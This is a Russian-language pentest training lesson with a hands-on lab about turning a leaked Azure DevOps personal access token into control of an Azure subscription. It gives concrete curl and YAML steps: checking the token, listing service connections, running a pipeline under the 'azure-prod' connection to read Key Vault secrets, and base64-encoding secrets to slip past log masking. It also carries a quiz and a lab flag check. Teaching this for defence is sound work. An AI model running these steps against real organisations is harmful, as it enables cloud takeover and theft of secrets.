---
id: cloud-azure-devops
title: "Azure DevOps: pipelines, service connections и PAT"
category: cloud
parent: cloud-azure-data-deep
difficulty: hard
order: 1
tags: [cloud, azure, devops, pipelines, service-connection, pat, agent]
prerequisites: [cloud-azure-data-deep, cloud-cicd-secrets]
useful_for:
  - "Атаки на Azure DevOps"
  - "Кража service connections и PAT"
  - "RCE на агентах сборки"
estimated_minutes: 50
summary: "Azure DevOps: Pipelines, variable groups, service connections, agent pools и PAT. Как из сборки получить креды к подписке Azure и всей организации."
lab:
  kind: shell
  title: "Практика: Azure DevOps — pipelines и service connections"
  toolset: [core]
  workdir: /home/student/azdevops
  files: [task.md, notes.md, service-connections.json, pipeline-log.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`service-connections.json` — подключения к Azure/репозиториям."
    - "Service connection с ролью Owner на подписку = захват облака."
    - "Найди флаг: `grep nto service-connections.json > found.txt`."

---

## Вопрос, с которого всё начинается

Ты разбираешь утёкший `.env` из чужого репозитория. Среди переменных — строка вида `AZDO_PAT=xxxxxxxxxxxxxxxxxxxx`. Соблазн: это «просто токен к гит-хостингу». Но если это Azure DevOps, за одним токеном может стоять подписка Azure целиком.

Вопрос урока: **как из одной строки-токена дойти до роли Contributor в проде** — и какие шаги по пути дают максимум.

## Наш пример: один PAT из лога

Мы будем вести один объект — **personal access token (PAT)**, найденный в `.env`:

```
AZDO_PAT=1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t
AZDO_ORG=https://dev.azure.com/acme
```

PAT — это **долгоживущий токен** (до года), который выдаётся вручную и несёт набор «scope'ов» — разрешений на части организации: код, сборки, service connections. В отличие от пароля, PAT не спрашивает MFA и не привязан к браузерной сессии.

Первое, что делаем — **проверяем, живой ли токен**. Показываем вывод и трактуем его.

## Шаг 1: проверяем PAT и смотрим, что он видит

Читать список проектов можно «сырым» REST-запросом, без установки CLI. Логин — пустой, токен идёт как пароль:

```bash
$ export PAT=1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t
$ curl -s -u :$PAT "https://dev.azure.com/acme/_apis/projects?api-version=7.0" | jq -r '.value[].name'
prod-app
infra
payments
```

Токен живой и видит три проекта. `-u :$PAT` означает «пустое имя пользователя, PAT как пароль» — так ADO принимает PAT. `jq` — утилита разбора JSON, `-r '.value[].name'` достаёт имена проектов из ответа.

Что дальше? Узнать, какие именно **scope'ы** у токена. Не все: PAT часто выдают широким «на всякий случай».

## Шаг 2: перечисляем, что даёт токен

Организация → проекты → репозитории/пайплайны. Проверяем ключевую вещь — **service connections**. Service connection — это сохранённые креды к внешнему сервису, чаще всего к подписке Azure. Пайплайн, использующий connection, автоматически получает эти права.

```bash
$ curl -s -u :$PAT "https://dev.azure.com/acme/payments/_apis/serviceendpoint/endpoints?api-version=7.1-preview.4" \
  | jq -r '.value[] | "\(.name)  \(.type)"'
azure-prod      azurerm
azure-staging   azurerm
```

Есть connection `azure-prod` типа `azurerm` — то есть креды в проде Azure. Теперь смотрим **variable groups** — наборы переменных пайплайна, которые иногда подтянуты из Azure Key Vault (хранилища секретов):

```bash
$ curl -s -u :$PAT "https://dev.azure.com/acme/payments/_apis/distributedtask/variablegroups?api-version=7.1-preview.1" \
  | jq -r '.value[] | "\(.name): \(.variables | keys | join(","))"'
prod-secrets: DB_PASSWORD,API_TOKEN,VAULT_URL
build-vars: NODE_ENV,API_URL
```

Имена `DB_PASSWORD`, `API_TOKEN` видны, а значения секретных переменных через API **не отдаются** (`isSecret: true` → `value: null`). Но нам это и не нужно: значения доступны **процессу пайплайна** во время выполнения. Значит, если мы можем запустить пайплайн, мы можем их напечатать.

## Шаг 3: запускаем свой пайплайн на чужом connection

Пайплайн — это YAML-файл, который описывает, что запустить. Мы не трогаем репозиторий: создаём **свой** пайплайн, который притворяется обычной сборкой и в одном шаге использует `azure-prod`.

Ключевая деталь — `azureSubscription: 'azure-prod'` в задаче `AzureCLI@2`: она прокидывает креды connection в наш скрипт.

```yaml
trigger: none
pool: { vmImage: 'ubuntu-latest' }
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: 'azure-prod'
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: |
        az account show
        az keyvault secret list --vault-name acme-prod
```

Запускаем через API (у нас есть scope Build — execute):

```bash
$ curl -s -u :$PAT -X POST \
  "https://dev.azure.com/acme/payments/_apis/pipelines?api-version=7.0" \
  -H "Content-Type: application/json" \
  -d '{"name":"diag","configuration":{"type":"yaml","path":"diag.yml"}}' | jq -r '.id'
42
```

Ответ `id: 42` — пайплайн создан. После запуска в логах читаем то, что напечатал `az account show`:

```
{
  "user": { "name": "sp-azure-prod", "type": "servicePrincipal" },
  "tenantId": "72f988bf-...",
  "name": "Acme Production",
  "state": "Enabled"
}
```

Мы — **service principal `sp-azure-prod`** в подписке Acme Production. Один утёкший PAT превратился в идентичность внутри Azure. `az keyvault secret list` покажет список секретов хранилища, а `az keyvault secret show` — их значения.

## Шаг 4: что ещё стоит проверить

- **Self-hosted агенты.** Если пул не Microsoft-hosted, а свой, то выполнение кода идёт **на машине внутри корпоративной сети**. Тогда из пайплайна видно внутренние API, базы, `~/.azure`, `~/.aws`, `.env` соседних сборок. Это уже не «облако», а полноценный foothold в сети.
- **Environments и approvals.** Prod-деплой может требовать ручного подтверждения. Иногда approval стоит только на одном пайплайне, а тот же connection доступен из другого — проверяй все.
- **Маскирование секретов.** ADO вырезает из логов точные значения секретов. Обход: сначала закодировать значение, например `base64`, и напечатать уже кодированное — маскировщик ищет исходную строку и не сработает.

```bash
$ echo -n "$DB_PASSWORD" | base64
cHJvZC1zdXBlci1zZWNyZXQ=
```

## Если не сработало

PAT может быть «read-only»: он видит проекты, но не даёт создать пайплайн. Тогда не запускаем свой — ищем **существующий** пайплайн, у которого уже есть connection, и подсовываем изменения через доступ к коду (scope Code — write). Другой путь — **переменные, не помеченные секретными**: их значения отдаются через API напрямую.

Если и connection не даёт прав, проверь **workload identity federation**: service connection без пароля, доверяющий конкретной ветке/окружению. Подделав условие доверия (например, push в разрешённую ветку), можно получить тот же токен.

## Что мы теперь знаем

- PAT — полноценный билет в организацию, а не «токен для гита».
- Service connection = креды к Azure; пайплайн с ним исполняется **от имени** подписки.
- Секретные переменные не видны через API, но доступны процессу — их печатает твой пайплайн.
- Self-hosted агент — это мост из CI во внутреннюю сеть.
- Маскирование логов обходится кодированием значения.

## На что смотреть дальше

- Как устроены **workload identity federation** и подделка условий доверия — это отдельная ветка про OIDC.
- **GitHub Actions** как зеркало той же атаки: там `pull_request_target` и OIDC к облаку.
- **Self-hosted runner/agent** как точка входа в сеть: что на нём кешируется и какие креды лежат.

## Глазами защитника

PAT и service connections — главные активы Azure DevOps. PAT делают короткоживущими, с минимальными scopes; service connections ограничивают конкретными проектами и не дают доступ ко всей подписке. Триггеры из форков и внешние PR защищают approval'ами. Логи и аудит показывают, кто запускал пайплайны и что делал connection. Секреты в переменных пайплайна маскируют и хранят в Key Vault.

## Частые вопросы

**Что такое PAT и почему он ценен?**

Personal Access Token — долгоживущий токен доступа к Azure DevOps. Утёкший PAT с широкими scopes даёт доступ к репозиториям, пайплайнам и service connections.

**Что даёт service connection?**

Связь пайплайна с внешним ресурсом (подписка Azure, другой сервис) с его правами. Запустив свой пайплайн на чужом connection, ты действуешь от его имени.

**Как исполнить свой код в пайплайне?**

Изменить YAML в репозитории, открыть PR или запустить pipeline через API. Часто достаточно прав на запись в репозиторий или на запуск сборок.

**Что проверять после получения PAT?**

Scopes токена, доступные проекты и репозитории, service connections, права на пайплайны. Затем — что можно сделать от имени connection.

**Чем Azure DevOps отличается от GitHub Actions?**

Другая модель сущностей (organizations, projects, agent pools) и свой механизм connections. Но логика та же: секреты в переменных, доверие к PR, права раннера.

**Что такое agent pool?**

Пул агентов, на которых исполняются пайплайны. Self-hosted агент может переиспользоваться между проектами и сохранять секреты прошлых запусков.

**Как найти секреты в логах Azure DevOps?**

Ищи отладочный вывод, `echo` переменных, несработавшее маскирование. Сканируй логи на паттерны токенов.

**Как защититься?**

Короткие PAT с узкими scopes, ограничение service connections, approval для форков, аудит запусков, Key Vault для секретов.

## Разбор: PAT из лога → пайплайн → подписка

В публичном логе сборки остался PAT, выведенный отладочным шагом. Атакующий проверяет его запросом к API организации, видит все проекты и service connections. Через API он запускает pipeline, который использует connection к Azure-подписке, и получает доступ к её ресурсам. Если у connection роль Contributor, он может поднять VM и назначить себе Owner — то есть эскалировать до полного контроля подписки. Один токен в логе превращается в контроль над облачной подпиской. Защита — короткоживущие PAT, маскирование логов, узкие service connections и approval перед запуском.

**Как проверить PAT без разрушений?**

Только чтение: список проектов, репозиториев, пайплайнов. Не запускай чужие pipeline и не меняй настройки, пока не понял последствия.

**Что такое `System.AccessToken`?**

Токен, которым пайплайн пользуется для доступа к Azure DevOps API. Если он попадает в логи или в шаг, из него можно достать права на репозиторий.

## Квиз

Проверь себя.

```quiz
- question: "Что хранит Azure DevOps service connection?"
  options:
    - "Креды (service principal или managed identity) к Azure либо внешнему сервису"
    - "Только имя проекта"
    - "Логи пайплайна"
    - "DNS-записи"
  answer: 0
  explanation: "Service connection аутентифицирует пайплайн в целевой подписке."
- question: "Почему PAT опаснее обычного пароля?"
  options:
    - "Он долгоживущий, не требует MFA и несёт набор scope'ов на организацию"
    - "Он всегда только для чтения кода"
    - "Он истекает через час"
    - "Он работает только из браузера"
  answer: 0
  explanation: "PAT выдаётся вручную на срок до года и действует без интерактивного входа."
- question: "Зачем атакующему self-hosted агент Azure DevOps?"
  options:
    - "Выполнение кода в корпоративной сети под сервисным аккаунтом"
    - "Только ускорение сборки"
    - "Шифрование артефактов"
    - "Расчёт биллинга"
  answer: 0
  explanation: "Self-hosted агент — это машина во внутренней сети, часто с широкими правами."
- question: "Как обойти маскирование секрета в логах ADO?"
  options:
    - "Закодировать значение (например, base64) перед выводом"
    - "Секреты в ADO не маскируются"
    - "Переключиться на SSH"
    - "Отключить Key Vault"
  answer: 0
  explanation: "Маскировщик ищет точную строку секрета; кодированная форма ему не совпадает."
```

## Куда дальше

В следующем уроке мы спустимся с уровня CI на уровень контейнера: возьмём открытый Docker socket и покажем, как из него стать root'ом на хосте. А пока главное запомни: **один PAT в CI — это потенциально вся подписка Azure**, и путь к ней лежит через service connection.

## Где пригодится

- **Пентест Azure:** путь от CI к подписке.
- **Red team:** кража service connections.
- **Blue team:** аудит PAT и connections.
- **Сертификация:** AZ-400 / AZ-500.
